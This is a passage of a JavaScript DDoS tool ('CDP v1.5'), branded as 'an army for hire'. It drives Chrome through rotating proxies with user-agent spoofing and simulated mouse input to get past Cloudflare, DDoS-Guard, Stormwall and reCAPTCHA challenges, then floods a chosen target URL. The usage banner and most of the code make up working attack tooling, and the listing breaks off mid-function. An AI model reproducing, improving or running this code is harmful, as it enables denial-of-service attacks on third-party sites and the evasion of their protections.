/*


    npm install ws puppeteer@latest colors request proxy-chain hpack chrome-launcher

    npx puppeteer browsers install chrome@stable
*/

const { spawn } = require('child_process');
const cluster = require('cluster');
const { EventEmitter } = require('events');
const WebSocket = require('ws');
const fs = require('fs');
const timers = require('timers/promises');
const puppeteer = require('rebrowser-puppeteer-core');
const colors = require('colors');
const proxyChain = require('proxy-chain');
var request = require('request');

process.env.REBROWSER_PATCHES_RUNTIME_FIX_MODE = "alwaysIsolated"
process.env.CHROME_PATH = '/home/codespace/.cache/puppeteer/chrome/linux-136.0.71063.94/chrome-linux64/chrone';  // Updated Path ✅
// process.env.CHROME_PATH = '/root/.cache/puppeteer/chrome/linux-129.0.6668.58/chrome-linux64/chrome';

EventEmitter.setMaxListeners(0)
process.on('uncaughtException', function (e)  {
    console.log(e)
});
process.on('unhandledRejection', function (e) {
    console.log(e)
});

if (process.argv.length < 7) {
    console.clear();
    console.log(`\n                          ${'ATLAS API CORPORATION'.red.bold} ${'|'.bold} ${'an army for hire'.white.bold}`);
    console.log(`\r\n                                      ${colors.bgWhite.black.italic(' 9 September, 2024 ')}\r\n`);
    console.log(colors.cyan("                                          t.me/NODESX19"));
    console.log(`
    ${'🚀 '.bold}${colors.magenta.bold('CDP v1.5')} | ${`${`Bypasses Cloudflare`.yellow.bold}, ${`HTTPDDOS`.yellow.bold}, ${`DDoS-Guard`.yellow.bold}, ${'Recaptcha'.yellow.bold}, ${'Stormwall'.yellow.bold} & ${'ReactJS'.yellow.bold}`.italic},
                  ${`advanced debugging, user-agent spoofing, rendering modes, ratelimit bypass,
                  built-in proxy checker, updated flooder, geoblock bypass & some bug fixes.`.italic}

    ————————————————————————————————————————————————————————————————————————————————————————

    ${'❓'.bold} ${'USAGE'.bold}:

        ${`xvfb-run node CDP.js ${'['.red.bold}target${']'.red.bold} ${'['.red.bold}time${']'.red.bold} ${'['.red.bold}threads${']'.red.bold} ${'['.red.bold}ratelimit${']'.red.bold} ${'['.red.bold}proxyfile${']'.red.bold} ${'('.red.bold}options${')'.red.bold}`.italic}
        ${'xvfb-run node CDP.js https://atlasapi.co 60 5 30 http.txt --ratelimit true'.italic}

    ${'⚙️'.bold}  ${'OPTIONS'.bold}:

        --debug         ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${`Show browser and flooder logs.`.italic}   [default: ${'true'.green}]
        --spoof         ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Spoof chrome user-agent.'.italic}         [default: ${'false'.red}]
        --bypass        ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Bypass all protections.'.italic}          [default: ${'true'.green}]
        --headless      ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Render browser with UI.'.italic}          [default: ${'false'.red}]
        --ratelimit     ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Bypass ratelimiting.'.italic}             [default: ${'false'.red}]

        --threads         ${'5'.yellow}/${'rand'.cyan}       ${'~'.red.bold}     ${'Number of flooder threads.'.italic}       [default: ${'1'.yellow}]
        --timeout         ${'120000'.yellow}       ${'~'.red.bold}     ${'Browser timeout duration (ms).'.italic}   [default: ${'60000'.yellow}]

        --origin         ${'US'.cyan},${'RU'.cyan},${'CN'.cyan}      ${'~'.red.bold}     ${`Specify country of proxy.`.italic}        [default: ${'*'.yellow}]
        --verify        ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Check all proxy connections.'.italic}     [default: ${'false'.red}]
        --auth          ${'true'.green}/${'false'.red}     ${'~'.red.bold}     ${'Enable proxy authentication.'}     [default: ${'false'.red}]

    ——> ${'flooder'.bold.underline}: ${'['.bold} ${'reset'.italic}${','.red} ${'randrate'.italic}${','.red} ${'randpath'.italic}${','.red} ${'close'.italic}${','.red} ${'http'.italic}${','.red} ${'delay'.italic}${','.red} ${'streams'.italic}${','.red} ${'query'.italic}${','.red} ${'referer'.italic} ${']'.bold}
    `);
    process.exit(0)
};

const target = process.argv[2]// || 'https://localhost:443';
const duration = parseInt(process.argv[3])// || 0;
const threads = parseInt(process.argv[4]) || 10;
let rate = process.argv[5] || 64;
const proxyfile = process.argv[6] || 'proxies.txt';

function error(msg) {
    console.log(`   ${'['.red}${'error'.bold}${']'.red} ${msg}`)
    process.exit(0)
}

if (!proxyfile) { error("Invalid proxy file!")}
if (!target || !target.startsWith('https://') && !target.startsWith('http://')) { error("Invalid target address!")}
if (!duration || isNaN(duration) || duration <= 0) { error("Invalid duration format!") }
if (!threads || isNaN(threads) || threads <= 0) { error("Invalid threads format!") }
if (!rate || isNaN(rate) || rate <= 0) { error("Invalid ratelimit format!") }

var parsed = new URL(target);

let countries = [];
let flooders = [];

const processes = [];

const raw_proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
if (raw_proxies.length <= 0) { error("Proxy file is empty!") }

function shuffle_proxies(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

const proxies = shuffle_proxies(raw_proxies);

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    /* browser options */
    { flag: '--debug', value: get_option('--debug'), default: true },
    { flag: '--spoof', value: get_option('--spoof'), default: false },
    { flag: '--bypass', value: get_option('--bypass') , default: true },
    { flag: '--headless', value: get_option('--headless'), default: false },
    { flag: '--ratelimit', value: get_option('--ratelimit'), default: true },

    /* connect options */
    { flag: '--threads', value: get_option('--threads'), default: 1 },
    { flag: '--timeout', value: get_option('--timeout'), default: 60000 },

    /* proxy options */
    { flag: '--origin', value: get_option('--origin'), default: undefined },
    { flag: '--verify', value: get_option('--verify'), default: false },
    { flag: '--auth', value: get_option('--auth'), default: false },

    /* flooder options */
    // { flag: '--reset', value: get_option('--reset'), default: true },
    // { flag: '--ratelimit', value: get_option('--ratelimit'), default: true },
    // { flag: '--randrate', value: get_option('--randrate'), default: false },
    // { flag: '--randpath', value: get_option('--randpath'), default: false },
    // { flag: '--close', value: get_option('--close'), default: true },
    // { flag: '--delay', value: get_option('--delay'), default: 10 },
    // { flag: '--streams', value: get_option('--streams'), default: 1 },
    { flag: '--reset', value: get_option('--reset') },
    { flag: '--ratelimit', value: get_option('--ratelimit') },
    { flag: '--randrate', value: get_option('--randrate') },
    { flag: '--randpath', value: get_option('--randpath') },
    { flag: '--close', value: get_option('--close') },
    { flag: '--delay', value: get_option('--delay') },
    { flag: '--streams', value: get_option('--streams') },
    { flag: '--ram', value: get_option('--ram') },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }
    
    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    return false;
}

var headless = enabled('headless');
const verify = enabled('verify');
const origin = enabled('origin');
const auth = enabled('auth');

function log(type, string) {
    let script;
    switch (type) {
        case 1:
            script = "node/cdp";
            break;
        case 2:
            script = "node/flooder";
            break;
        default:
            script = "node/cdp";
            break;
    }
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
        hours = "undefined";
        minutes = "undefined";
        seconds = "undefined";
    }

    if (enabled('debug')) {
        console.log(`(${`${hours}:${minutes}:${seconds}`.cyan}) [${colors.magenta.bold(script)}] | ${string}`);
    }
}

function parse_cookie(c) {
    let result = [`${c.name}=${c.value}`]
    return result.join('; ')
}

function random_int(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

class CdpClient extends EventEmitter {
    constructor(url) {
        super();
        this.id = 1;
        this.ws = new WebSocket(url);
        this.ids = {};

        this.ws.on('message', (msg) => {
            const data = JSON.parse(msg);
            if (!data.result && !data.error) {
                this.emit(data.method, data.params);
                return;
            } else {
                if (!data.id) console.log(data);
            }

            if (this.ids[data.id] != null) {
                if (data.error) {
                    this.ids[data.id].reject(JSON.stringify(data.error));
                } else {
                    this.ids[data.id].resolve(data.result);
                }
            }
        });

        this.ws.on('open', () => {
            this.emit('open');
        });
    }

    async send(method, params, sessionId) {
        const myId = this.id++;
        this.ws.send(JSON.stringify({
            id: myId,
            method,
            params,
            sessionId
        }));
        return await new Promise((resolve, reject) => {
            this.ids[myId] = { resolve, reject, params };
        });
    }
}

function exit() {
    for (const flooder of flooders) {
        flooder.kill();
    }

    for (const process of processes) {
        process.kill();
    }

    log(1, `${'Attack Ended!'.bold}`);
    process.exit(0);
}

process.on('SIGTERM', () => {
    console.log("sigterm")
    exit();
}).on('SIGINT', () => {
    console.log("sigint");
    exit();
});

async function sleep(duration) {
    await new Promise(resolve => setTimeout(resolve, duration));
}

async function geolocation(proxy) {
    const options = {
        headers: {
            "User-Agent": "curl/7.58.0",
        },
    }

    if (enabled('verify')) {
        options.proxy = `http://${proxy}`;
    }

    return await new Promise((resolve, reject) => {
        request.get(`http://ifconfig.co/json?ip=${proxy.split(':')[0]}`, options, (err, resp, body) => {
            try {
                if (err) {
                    reject(err)
                }
                if (resp && resp.statusCode !== 200) {
                    reject(new Error("Invalid statuscode"));
                }
    
                if (verify && !origin) {
                    log(1, `(${colors.magenta(proxy)}), ${colors.bold('Working Proxy')}`);
                    resolve();
                    return;
                }
    
                if (origin) {
                    try {
                        const data = JSON.parse(body);
                        if (countries.includes(data.country_iso.trim())) {
                            log(1, `(${colors.magenta(proxy)}), ${colors.bold('country')}: ${data.country_iso}`);
                            resolve()
                        } else {
                            reject(new Error("not in list"))
                        }
                    } catch (error) { reject(error); }
                }
                resolve();
            } catch (err) {
                reject(err);
            }
        });
    });
}

const stormwall = async (client, sessionId, proxy) => {
    return new Promise(async (resolve, reject) => {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('Stormwall Captcha')}`);
    
        for (let i = 0; i < random_int(2, 4); i++) {
            let x = random_int(420, 840);
            let y = random_int(69, 128);
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId);
            await sleep(100);
        }

        await sleep(random_int(1500, 3000));
        
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Stormwall Captcha')}: ${colors.green('Solved')}`);
        rate = 8
        resolve();
    })
}

const reactJS = async (client, sessionId, proxy) => {
    return new Promise(async (resolve, reject) => {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('ReactJS')}`);

        for (let i = 0; i < random_int(5, 10); i++) {
            let x = random_int(420, 840);
            let y = random_int(69, 120);
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId);
            if (Math.random() < 0.5) {
                await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left", x: x, y: y, clickCount: 1 }, sessionId);
                await sleep(random_int(200));
                await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: x, y: y, clickCount: 1 }, sessionId);
            }
            await sleep(150);
        }

        await sleep(random_int(2500, 5000));

        log(1, `(${colors.magenta(proxy)}) ${colors.bold('ReactJS')}: ${colors.green('Solved')}`);
        rate = 4;
        resolve();
    })
}

const recaptcha = async (client, sessionId, proxy) => {
    return new Promise(async (resolve, reject) => {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('ReCaptcha')}`);

        const recaptcha_selector = `JSON.stringify(document.querySelector('#recaptcha-anchor > div.recaptcha-checkbox-border').getBoundingClientRect().toJSON())`;
        var errors = 0;
        const in1 = setInterval(async () => {
            client.send('Runtime.evaluate', { expression: recaptcha_selector }, sessionId)
            .then(async rect => {
                if (rect.result && rect.result.subtype !== 'error') {
                    return JSON.parse(rect.result.value)
                } else {
                    errors += 1;
                    if (errors >= 3) {
                        clearInterval(in1);
                        reject();
                    }
                }
            }).then(async rect => {
                if (rect && rect.x) {
                    const x = rect.x + rect.width / 2;
                    const y = rect.y + rect.height / 2;
                    await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId)
                    await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left", x: x, y: y, clickCount: 1 }, sessionId)
                    await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: x, y: y, clickCount: 1 }, sessionId)
                    resolve();
                }
            }).catch((err) => {
                errors += 1;
                if (errors >= 5) {
                    clearInterval(in1);
                    reject();
                }
            })
        }, 1000).unref()
    })
}

const ddosguard = async (client, sessionId, proxy) => {
    return new Promise(async (resolve, reject) => {
        log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('DDoS-Guard')}`);

        const Title = async () => {
            let title = await client.send('Runtime.evaluate', { expression: `document.title` }, sessionId).catch(() => {
                clearInterval(title_interval)
            })
            if (title.result != null) {
                title = title.result.value
            }

            return title;
        }

        const main_interval = setInterval(async () => {
            const title = await Title();
            if (title && title !== "DDoS-Guard") {
                clearInterval(main_interval);
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('DDoS-Guard')}: ${colors.green('Solved')}`);
                rate = 2;
                resolve();
            }

            var x = random_int(101, 1200) + 50;
            var y = random_int(101, 600) + 20;
            var counter = random_int(10, 100);

            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId);
            await sleep(random_int(100, 300));
            await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left", x: x, y: y, clickCount: random_int(1, 2) }, sessionId);
            await sleep(random_int(300, 600));
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x - counter, y: y + counter }, sessionId);
            await sleep(random_int(50, 100));
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x - counter + random_int(0, 10), y: y + counter + random_int(0, 10) }, sessionId);
            await sleep(random_int(40, 90));
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x - counter + random_int(11, 20), y: y + counter + random_int(11, 20) }, sessionId);
            await sleep(random_int(30, 80));
            await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x - counter + random_int(0, 10), y: y + counter + random_int(0, 10) }, sessionId);
            await sleep(random_int(20, 70));
            await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: x, y: y, clickCount: 1 }, sessionId)
        }, 1000);
    })
}

const popupCF = async (client, sessionId, proxy) => {
    await new Promise((resolve, reject) => {
        const recaptcha_selector = `JSON.stringify(document.querySelector('#cf-error-details > div.cf-section.cf-wrapper > div > div > form > button').getBoundingClientRect().toJSON())`;
        var errors = 0;
        const in1 = setInterval(async () => {
            client.send('Runtime.evaluate', { expression: recaptcha_selector }, sessionId)
            .then(async rect => {
                if (rect.result && rect.result.subtype !== 'error') {
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('PopupCF')}`);
                    return JSON.parse(rect.result.value)
                } else {
                    errors += 1;
                    if (errors >= 3) {
                        clearInterval(in1);
                        reject();
                    }
                }
            }).then(async rect => {
                if (rect && rect.x) {
                    const x = rect.x + rect.width / 2;
                    const y = rect.y + rect.height / 2;
                    await client.send("Input.dispatchMouseEvent", { type: "mouseMoved", x: x, y: y }, sessionId)
                    await client.send("Input.dispatchMouseEvent", { type: "mousePressed", button: "left", x: x, y: y, clickCount: 1 }, sessionId)
                    await client.send("Input.dispatchMouseEvent", { type: "mouseReleased", button: "left", x: x, y: y, clickCount: 1 }, sessionId)
                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('popupCF')}: ${colors.green('Solved')}`);
                    resolve();
                }
            }).catch((err) => {
                errors += 1;
                if (errors >= 5) {
                    clearInterval(in1);
                    reject();
                }
            })
        }, 1000).unref()
    })
}

const drawPoint = async (client, sessionId, proxy, width, height, x, y) => {
    const script = `
            (function() {
                const rect = document.createElement('div');
                rect.style.position = 'absolute';
                rect.style.left = '${x}px';
                rect.style.top = '${y}px';
                rect.style.width = '${width}px';
                rect.style.height = '${height}px';
                rect.style.backgroundColor = 'red';
                rect.style.border = '1px solid black';
                document.body.appendChild(rect);
            })();
        `;
    client.send('Runtime.evaluate', { expression: script }, sessionId);
    return;

}

const window = async (client, sessionId) => {
    try {
        const result = await client.send('Browser.getWindowForTarget', {}, sessionId);
        const width = result.bounds.width;
        const height = result.bounds.height;
        const dynamics = { width, height };
        return dynamics;
    } catch (err) {
        return { width: Math.floor(Math.random() * 1920), height: Math.floor(Math.random() * 1080) };
    }
};

if (cluster.isPrimary) {
    if (origin) {
        try {
            countries = origin.split(',').map(country => country.toUpperCase().trim());
        } catch (_) { error("Invalid origin format!"); return;
        }
    }

    setTimeout(() => {
        exit();
    }, Number(duration) * 1000)

    let usedProxies = {}
    for (let i = 0; i < threads; i++) {
        let main = () => new Promise(async (resolve) => {
            let proxy = proxies[~~(Math.random() * (proxies.length))];
            if (origin || verify) {
                await geolocation(proxy).then(() => {
                    // console.log("valid proxy :)");
                }).catch((_err) => {
                    return main();
                })
            }
            while (usedProxies[proxy]) {
                if (Object.keys(usedProxies).length == proxies.length) {
                    usedProxies = {};
                    return;
                }
                proxy = proxies[~~(Math.random() * (proxies.length))];
            }

            usedProxies[proxy] = true;

            const platforms = [
                'X11; Linux x86_64',
                'Macintosh; Intel Mac OS X 10_15_7',
                'Windows NT 10.0; Win64; x64'
            ]

            const platform = platforms[~~Math.floor(Math.random() * platforms.length)];
            const version = random_int(126, 129);
            // const ua = `Mozilla/5.0 (${platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
            const ua = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
            const port = 1000 + Math.floor(Math.random() * 59000);
            headless = headless ? true : !headless ? false : true;

            const args = [
                // '--disable-extensions-except=bypass',
                // '--load-extension=bypass',
                // '--window-size=1920,1080',
                // '--start-maximized',
                // '--disable-blink-features=AutomationControlled',
                // '--disable-features=IsolateOrigins,site-per-process',
                // '--use-fake-device-for-media-stream',
                // '--use-fake-ui-for-media-stream',
                // '--no-sandbox',
                // '--disable-dev-shm-usage',
                // '--disable-software-rasterizer',
                // '--enable-features=NetworkService',
                // `--remote-debugging-port=${port}`,
                // '--num=1',
                // '--no-process-per-site',
                // '--disable-setuid-sandbox',
                // '--disable-features=Translate,OptimizationHints,MediaRouter,DialMediaRouteProvider,CalculateNativeWinOcclusion,InterestFeedContentSuggestions,CertificateTransparencyComponentUpdater,AutofillServerCommunication,PrivacySandboxSettings4,AutomationControlled'
            ]

            if (auth) {
                try {
                    let [host, port, username, password] = proxy.split(':');
                    const proxyURL = `http://${username}:${password}@${host}:${port}`;
                    const anonymizedProxyUrl = await proxyChain.anonymizeProxy(proxyURL);
                    // console.log(anonymizedProxyUrl.split('://')[1]);
                    
                    args.push(`--proxy-server=${anonymizedProxyUrl}`);
                } catch (err) {
                    log(1, `${'Error'.bold}: ${'Failed to initialize proxy'.red.italic}`);
                    return main();
                }
            } else {
                let [host, port] = proxy.split(':');
                const proxyURL = `http://${host}:${port}`;
                args.push(`--proxy-server=${proxyURL}`)
            }

            if (enabled('spoof')) {
                args.push(`--user-agent=${ua}`);
            }

            const { launch, Launcher } = await import('chrome-launcher');

            // console.log("launching chrome");

            const chrome = await launch({
                ignoreDefaultFlags: true,
                // port: port,
                chromeFlags: [
                    ...(
                            [
                                ...Launcher.defaultFlags().filter(item => !item.includes("--disable-features") && !item.includes("component-update")),
                                // [`--headless=false`],
                                // ...args, ...((headless !== false) ? [`--headless=${headless}`] : []),
                                // ...((proxy && proxy.host && proxy.port) ? [`--proxy-server=${proxy.host}:${proxy.port}`] : []),
                                '--disable-features=Translate,OptimizationHints,MediaRouter,DialMediaRouteProvider,CalculateNativeWinOcclusion,InterestFeedContentSuggestions,CertificateTransparencyComponentUpdater,AutofillServerCommunication,PrivacySandboxSettings4,AutomationControlled',
                                "--no-sandbox",
                                '--disable-extensions-except=bypass',
                                '--load-extension=bypass',
                                ...args
                            ]
                    ),
                ],
            });

            console.log(`Chrome launched on port: ${chrome.port}`);

            processes.push(chrome);

            const browser = await puppeteer.connect({
                browserURL: `http://127.0.0.1:${chrome.port}`,
            });

            let browser_version = await browser.version();
            browser_version = browser_version.split('.')[0];

            const wsEndpoint = browser.wsEndpoint();
            const client = new CdpClient(wsEndpoint);
            
            client.on('open', async () => {
                log(1, `(${colors.magenta(proxy)}) ${colors.bold('Opening WebSocket')} (${colors.underline(browser_version)})`);
                const targetsResponse = await client.send('Target.getTargets');
                const pageTargets = targetsResponse.targetInfos.filter(info => info.type === 'page');
                for (let pageTarget of pageTargets) {
                    async function attachTarget() {
                        let solved = false;
                        let _turnstile = false;
                        let cloudflare = false;
                        let protection;

                        let titleValue = "invalid_title"
                        let titles = []

                        async function title(sessionId) {
                            let title_interval = setInterval(async () => {
                                let title = await client.send('Runtime.evaluate', { expression: `document.title` }, sessionId).catch(() => {
                                    clearInterval(title_interval)
                                })
                                let title2 = (await client.send('Runtime.evaluate', { expression: `document.body && document.body.innerHTML` }, sessionId))

                                try {
                                    if (title.result && title.result.value && title2.result.value.includes("Failed to load URL")) {
                                        await browser.close();
                                        return
                                    }
                                } catch { }

                                if (!title)
                                    return

                                if (title.result != null) {
                                    title = title.result.value
                                } else {
                                    title = "errorrr"
                                }

                                if (title.includes('Attention Required! | Cloudflare')) {
                                    await popupCF(client, sessionId, proxy).catch(async (err) => {
                                        // actually blocked!
                                        log(1, `(${colors.magenta(proxy)}) ${'Blocked by Cloudflare'.bold.red}`);
                                        await browser.close();
                                        return;
                                    });
                                }

                                if (title !== titleValue && !titles.includes(title) || solved) {
                                    titleValue = title

                                    if (titleValue.startsWith("Failed to load URL ")) {
                                        console.log({ proxy })
                                        await browser.close();
                                        clearInterval(title_interval)
                                        return
                                    }

                                    if (titleValue === '') {
                                        titleValue = parsed.hostname;
                                    }

                                    if (!titles.includes(titleValue) || titles.length === 0) {
                                        log(1, `(${colors.magenta(proxy)}) ${'Title'.bold}: ${colors.italic(titleValue)}`)
                                    }

                                    titles.push(titleValue);

                                    if (!title.includes("Just a moment...") && !title.includes("Security Check") && !title.includes("Check your browser...")) {
                                        if (!_turnstile && protection !== 'recaptcha') {
                                            solved = true;
                                        }
                                        clearInterval(title_interval);
                                        return;
                                    } else {
                                        if (!cloudflare) {
                                            cloudflare = true;
                                        }
                                        // await turnstile(sessionId)
                                    }
                                }
                            }, 500).unref()
                        }

                        const { sessionId } = await client.send('Target.attachToTarget', {
                            targetId: pageTarget.targetId,
                            flatten: true,
                        })

                        await client.send('Page.addScriptToEvaluateOnNewDocument', {
                            source: `(() => {
                                Object.defineProperty(MouseEvent.prototype, 'screenX', {
                                    get: function() {
                                        return this.clientX + window.screenX;
                                    }
                                });
                                Object.defineProperty(MouseEvent.prototype, 'screenY', {
                                    get: function() {
                                        return this.clientY + window.screenY;
                                    }
                                });
                            })()`
                        }, sessionId);

                        await client.send('Network.enable', {}, sessionId);

                        let mainRequestId;

                        client.on('Network.requestWillBeSent', (data) => {
                            if (data.type === 'Document' && !mainRequestId) {
                                mainRequestId = data.requestId;
                            }
                        });

                        let paused = false
                        await client.send('Debugger.enable', {}, sessionId)
                        client.on('Target.targetCreated', async (data) => {
                            if (data.targetInfo.type == 'shared_worker') {
                                await client.send('Debugger.pause', {}, sessionId).catch(() => console.log("ERR"))

                                await client.send('Target.attachToTarget', {
                                    targetId: data.targetInfo.targetId,
                                    flatten: true,
                                })
                            }
                        })

                        const emitter = new EventEmitter()

                        client.on('Target.targetDestroyed', (data2) => {
                            emitter.emit(data2.targetId);
                        });

                        client.on('Target.targetCrashed', (data2) => {
                            emitter.emit(data2.targetId);
                        });

                        let queue = []

                        function q() {
                            setTimeout(async () => {
                                if (queue.length > 0)
                                    await queue.pop()()
                                q()
                            }, 10)
                        }
                        q()

                        const frames = [];
                        var counter = 0;

                        // await window(client, sessionId).then(async (dynamics) => {
                        //     try {
                        //         if (dynamics && dynamics.height && dynamics.width) {
                        //             await client.send('Emulation.setDeviceMetricsOverride', {
                        //                 mobile: false, width: 800, height: 600, deviceScaleFactor: 1,
                        //                 screenOrientation: {
                        //                     angle: 0,
                        //                     type: "portraitPrimary"
                        //                 }
                        //             }, sessionId);
                        //             await client.send('Emulation.setTouchEmulationEnabled', { enabled: false }, sessionId);
                        //         }
                        //     } catch (_) {}
                        // })

                        client.on('Target.attachedToTarget', async (data) => {
                            queue.push(async () => {
                                client.send('Runtime.evaluate', { expression: "" }, data.sessionId).catch(() => { })
                                await client.send('Runtime.runIfWaitingForDebugger', {}, data.sessionId).catch(() => { })
                                if (!data.waitingForDebugger) {
                                    if (paused) {
                                        paused = false
                                        await client.send('Runtime.runIfWaitingForDebugger', {}, sessionId).catch(() => console.log("ERR4"))
                                        await client.send('Debugger.pause', {}, sessionId).catch(() => console.log("ERR2"))
                                        await client.send('Debugger.resume', {}, sessionId).catch(() => console.log("ERR3"))
                                    }
                                }
                                if (data.targetInfo.type == 'iframe') {
                                    frames.push(data);
                                    if (protection === 'recaptcha' && !solved) {
                                        counter += 1;
                                        if (frames.length >= 2) {
                                            await recaptcha(client, data.sessionId, proxy).then(() => {
                                                if (!solved) {
                                                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('ReCaptcha')}: ${colors.green('Solved')}`);
                                                        solved = true;
                                                    }
                                            }).catch((_) => {})
                                        }
                                    } else if (!protection) {
                                        if (!_turnstile) {
                                            log(1, `(${colors.magenta(proxy)}) ${'Protection'.bold}: ${colors.red('Cloudflare Captcha')}`)
                                            _turnstile = true;
                                        }
                                        // await turnstile(client, sessionId, data, proxy);
                                    }
                                } else {
                                    await client.send('Target.detachFromTarget', { sessionId: data.sessionId }, sessionId).catch(() => { })
                                };
                            })
                        })

                        await client.send('Target.setDiscoverTargets', { discover: true }, sessionId)
                        await client.send('Target.setAutoAttach', { autoAttach: true, waitForDebuggerOnStart: true, flatten: true }, sessionId)

                        await client.send('Page.enable', {}, sessionId)

                        let request = null
                        let mainFrame = null
                        let response = false

                        let solving = false;

                        await new Promise(async (resolve, reject) => {
                            const requestsIds = {}
                            client.on('Network.requestWillBeSent', async (data) => {
                                requestsIds[data.requestId] = data
                            })
                            client.on('Network.requestWillBeSentExtraInfo', (data) => {
                                if (!requestsIds[data.requestId]) {
                                    return;
                                }
                                Object.assign(requestsIds[data.requestId], {
                                    extra: data
                                })
                                if (mainFrame.frameId == requestsIds[data.requestId].frameId && requestsIds[data.requestId].type == 'Document') {
                                    request = requestsIds[data.requestId].extra.headers
                                }
                            })
                            client.on('Network.responseReceived', async (data) => {
                                if (data.response.status === 407) {
                                    // proxy auth required
                                    log(1, `(${colors.magenta(proxy)}) ${colors.bold.red('Error')}: ${`Proxy Authentication Required!`.italic}`);
                                    return main();
                                }
                                if (data.frameId == mainFrame.frameId) {
                                    response = true
                                }
                            })

                            client.on('Network.loadingFinished', async (data) => {
                                if (data.requestId === mainRequestId) {
                                    const getBody = async () => {
                                        try {
                                            const result = await client.send('Network.getResponseBody', { requestId: mainRequestId }, sessionId);
                                            solving = true;
                                            if (result.body.includes('__js_p_') && result.body.includes('__jhash_')) {
                                                protection = 'stormwall';
                                                await stormwall(client, sessionId, proxy);
                                                resolve();
                                            } else if (result.body.includes('/vddosw3data.js')) {
                                                protection = 'reactjs';
                                                await reactJS(client, sessionId, proxy);
                                                resolve();
                                            } else if ((result.body.includes('g-recaptcha') && result.body.includes('data-sitekey')) /*|| result.body.includes('https://www.google.com/recaptcha/api.js?hl=en'*/) {
                                                protection = 'recaptcha';
                                                if (protection !== 'recaptcha') {
                                                    log(1, `(${colors.magenta(proxy)}) ${colors.bold('Protection')}: ${colors.red('ReCaptcha')}`);
                                                }
                                                resolve();
                                            } else if (result.body.includes('<title>DDoS-Guard</title>') && result.body.includes('Checking your browser before accessing')) {
                                                protection = 'ddosguard';
                                                await ddosguard(client, sessionId, proxy);
                                                resolve();
                                            } else if (result.body.includes('Suspected phishing site | Cloudflare')) {
                                                protection = 'popupCF';
                                                await popupCF(client, sessionId, proxy);
                                                resolve();
                                            }

                                            solving = false;
                                        } catch (error) {
                                            await sleep(2000);
                                            await getBody();
                                        }
                                    }
                                    await getBody()
                                }
                            })

                            mainFrame = await client.send('Page.navigate', { url: "about:blank" }, sessionId)

                            await client.send('Network.enable', {}, sessionId)
                            await client.send('Page.navigate', { url: target }, sessionId);

                            await title(sessionId);

                            const frameId = (await client.send('Page.getFrameTree', {}, sessionId)).frameTree.frame.id;
                            const worldName = 'myIsolatedWorld';
                            await client.send('Page.createIsolatedWorld', {
                                frameId,
                                worldName
                            }, sessionId);

                            const frameTree = await client.send('Page.getFrameTree', {}, sessionId);
                            const iframes = [];

                            function extract_frames(frameTree) {
                                iframes.push(frameTree.frame);
                                if (frameTree.childFrames) {
                                    frameTree.childFrames.forEach(childFrame => extract_frames(childFrame));
                                }
                            }

                            extract_frames(frameTree.frameTree);

                            const turnstile_selector = `JSON.stringify(document.querySelector('input[name="cf-turnstile-response"]').parentElement.getBoundingClientRect().toJSON())`;

                            for (let frame of iframes) {
                                const captcha_interval = setInterval(async () => {
                                    try {
                                        await sleep(1000);
                                        const result = await client.send('Runtime.evaluate', {
                                            expression: turnstile_selector,
                                            contextId: (await client.send('Page.createIsolatedWorld', {
                                                frameId: frame.id,
                                                worldName: 'myIsolatedWorld-' + frame.id
                                            }, sessionId)).executionContextId
                                        }, sessionId);
                        
